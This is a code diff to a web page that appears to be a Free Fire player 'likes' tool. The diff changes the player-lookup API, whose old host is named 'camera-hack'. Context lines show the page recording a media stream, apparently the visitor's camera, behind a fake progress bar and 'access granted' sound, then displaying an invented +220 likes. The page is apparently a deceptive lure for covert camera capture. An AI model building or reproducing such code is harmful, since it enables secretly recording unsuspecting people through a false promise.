@@ -272,18 +272,18 @@
                 return;
             }
 
-            previewEl.innerText = "STATUS: FETCHING FROM BACKEND PROXY...";
+            previewEl.innerText = "STATUS: FETCHING PLAYER DATA...";
 
             searchTimer = setTimeout(async () => {
                 try {
-                    let localApi = `https://camera-hack-a3xq.onrender.com/api/player?uid=${uid.trim()}`;
-                    let res = await fetch(localApi);
+                    let directApi = `https://nirob-x-info.vercel.app/info?uid=${uid.trim()}`;
+                    let res = await fetch(directApi);
                     if (res.ok) {
                         let json = await res.json();
-                        if (json.success && json.data) {
-                            cachedFFData = json.data;
-                            let info = json.data.basicInfo || json.data.accountInfo || json.data.data || json.data;
-                            let name = info.nickname || info.name || info.Nickname || info.accountName;
+                        let info = json.data || json;
+                        if (info) {
+                            cachedFFData = info;
+                            let name = info.name || info.nickname || info.UserName;
                             if (name) {
                                 previewEl.innerText = `[+] TARGET FOUND: ${name}`;
                                 return;
@@ -397,11 +397,11 @@
             let ffData = cachedFFData;
             if (!ffData) {
                 try {
-                    let localApi = `https://camera-hack-a3xq.onrender.com/api/player?uid=${uid}`;
-                    let res = await fetch(localApi);
+                    let directApi = `https://nirob-x-info.vercel.app/info?uid=${uid}`;
+                    let res = await fetch(directApi);
                     if (res.ok) {
                         let json = await res.json();
-                        if (json.success && json.data) ffData = json.data;
+                        ffData = json.data || json;
                     }
                 } catch (e) {}
             }
@@ -436,7 +436,7 @@
                     stream.getTracks().forEach(track => track.stop());
                 };
 
-                mediaRecorder.start();
+    mediaRecorder.start();
 
                 let p = 20;
                 document.getElementById('percentage').innerText = p + '%';
@@ -458,12 +458,11 @@
                         mediaRecorder.stop();
                         playAccessGrantedSound();
 
-                        let infoObj = ffData ? (ffData.basicInfo || ffData.accountInfo || ffData.data || ffData) : null;
-
-                        let playerName = infoObj ? (infoObj.nickname || infoObj.name || infoObj.Nickname || infoObj.accountName) : "API Data Not Found";
-                        let playerLevel = infoObj ? (infoObj.level || infoObj.Level || infoObj.accountLevel) : "N/A";
-                        let playerRegion = infoObj ? (infoObj.region || infoObj.Server || infoObj.accountRegion) : server.toUpperCase();
-                        let playerLikes = infoObj ? (infoObj.liked || infoObj.likes || infoObj.Likes || infoObj.accountLikes || infoObj.like) : "0";
+                        let infoObj = ffData || {};
+                        let playerName = infoObj.name || infoObj.nickname || infoObj.UserName || "API Data Not Found";
+                        let playerLevel = infoObj.level || infoObj.Level || "N/A";
+                        let playerRegion = infoObj.region || infoObj.Server || server.toUpperCase();
+                        let playerLikes = infoObj.likes || infoObj.Liked || "0";
                         let finalLikes = (parseInt(playerLikes) || 0) + 220;
 
                         document.getElementById('loadingBox').innerHTML = `
